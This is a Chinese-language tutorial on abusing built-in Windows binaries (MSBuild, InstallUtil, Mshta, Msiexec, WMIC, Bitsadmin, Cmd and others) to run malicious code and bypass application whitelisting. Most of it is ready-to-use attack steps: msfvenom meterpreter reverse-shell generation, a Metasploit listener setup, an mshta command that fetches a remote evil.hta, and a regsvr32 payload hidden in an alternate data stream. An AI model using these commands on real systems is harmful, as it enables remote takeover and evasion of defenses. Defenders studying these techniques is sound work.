### 恶意代码执行与系统白名单绕过技术

在网络安全领域，攻击者常常通过下载文件并执行特定操作来加载恶意代码或绕过系统的白名单检测。本文将介绍几种常见的Windows工具及其如何被利用来进行恶意操作。

#### 参考资料
- [LOLBAS Project](https://lolbas-project.github.io/)
- [GitHub LOLBAS Project](https://github.com/LOLBAS-Project/LOLBAS)

### MSBuild.exe
**概述**
MSBuild 是 Microsoft Build Engine 的缩写，用于编译 .NET 项目文件。它可以在没有安装 Visual Studio 的环境中运行，并且可以编译特定格式的 XML 文件。

**文件路径**
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe`

**执行恶意代码**
1. 使用 Metasploit 生成 shellcode：
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 -f csharp
   ```
2. 修改模板文件（例如：[msbuild-inline-task](https://github.com/3gstudent/msbuild-inline-task)），加入生成的 shellcode。
3. 在 Metasploit 中设置监听：
   ```bash
   msfconsole
   use exploit/multi/handler
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST 172.16.1.130
   set LPORT 4444
   set ExitOnSession false
   set autorunscript migrate -n explorer.exe
   exploit -j
   ```
4. 在目标机器上运行：
   ```bash
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe "C:\Users\jack.0DAY\Desktop\exec.xml"
   ```

### Installutil.exe
**概述**
Installutil 是一个命令行实用程序，用于安装和卸载服务器资源，通常与 System.Configuration.Install 命名空间中的类一起使用。

**文件路径**
- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe`
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe`

**执行恶意代码**
1. 生成 C# shellcode：
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 -f csharp
   ```
2. 下载并修改 `InstallUtil-Shellcode.cs` 文件，插入生成的 shellcode。
3. 编译并执行：
   ```bash
   csc /target:exe /out:InstallUtil-shell.exe InstallUtil-ShellCode.cs
   C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U D:\test\InstallUtil-shell.exe
   ```

### Mshta.exe
**概述**
Mshta.exe 是 Windows 用于运行 Microsoft HTML 应用程序 (HTA) 的工具。

**文件路径**
- `C:\Windows\System32\mshta.exe`
- `C:\Windows\SysWOW64\mshta.exe`

**执行恶意代码**
1. 生成 shellcode：
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 -f raw > shellcode.bin
   cat shellcode.bin | base64 -w 0
   ```
2. 将 shellcode 插入到 HTA 文件模板中，并托管该文件。
3. 目标机器执行：
   ```bash
   mshta.exe http://your-server/evil.hta
   ```

### Msiexec.exe
**概述**
Msiexec 是 Windows Installer 的一部分，用于安装 MSI 包。

**文件路径**
- `C:\Windows\System32\msiexec.exe`
- `C:\Windows\SysWOW64\msiexec.exe`

**执行恶意代码**
```bash
msiexec.exe /q /i evil.msi
```

### Wmic.exe
**概述**
WMIC 是 Windows Management Instrumentation Command-line 的缩写，提供从命令行接口执行系统管理的支持。

**文件路径**
- `C:\Windows\System32\wbem\wmic.exe`
- `C:\Windows\SysWOW64\wbem\wmic.exe`

**执行恶意代码**
1. 创建 XSL 文件并插入恶意脚本。
2. 执行 WMIC 命令：
   ```bash
   wmic os get /FORMAT:"C:\Users\WMI\poc-wmic.xsl"
   ```

### Atbroker.exe
**概述**
Atbroker.exe 是微软的辅助技术组件。

**文件路径**
- `C:\Windows\System32\Atbroker.exe`
- `C:\Windows\SysWOW64\Atbroker.exe`

**执行恶意代码**
1. 修改注册表以注册新的 AT 服务条目。
2. 执行恶意代码：
   ```bash
   ATBroker.exe /start shellcode
   ```

### Bash.exe
**概述**
Bash.exe 存在于安装了 Linux 子系统的 Windows 10 上。

**文件路径**
- `C:\Windows\System32\bash.exe`
- `C:\Windows\SysWOW64\bash.exe`

**执行恶意代码**
```bash
bash.exe -c "calc.exe"
```

### Bitsadmin.exe
**概述**
Bitsadmin.exe 用于管理后台智能传输服务 (BITS)。

**文件路径**
- `C:\Windows\System32\bitsadmin.exe`
- `C:\Windows\SysWOW64\bitsadmin.exe`

**传送并执行恶意命令**
```bash
bitsadmin /create 1
bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe
bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL
bitsadmin /RESUME 1
bitsadmin /complete 1
```

### Cmd.exe
**概述**
Cmd.exe 是 Windows 中的命令行解释器。

**文件路径**
- `C:\Windows\System32\cmd.exe`
- `C:\Windows\SysWOW64\cmd.exe`

**执行恶意代码**
1. 将内容添加到备用数据流 (ADS)：
   ```bash
   cmd.exe /c echo regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll > fakefile.doc:payload.bat
   ```
2. 执行存储在 ADS 中的 payload.bat：
   ```bash
   cmd.exe - < fakefile.doc:payload.bat
   ```

这些方法展示了攻击者如何利用常见的 Windows 工具进行恶意操作。了解这些技术有助于提高系统的安全性。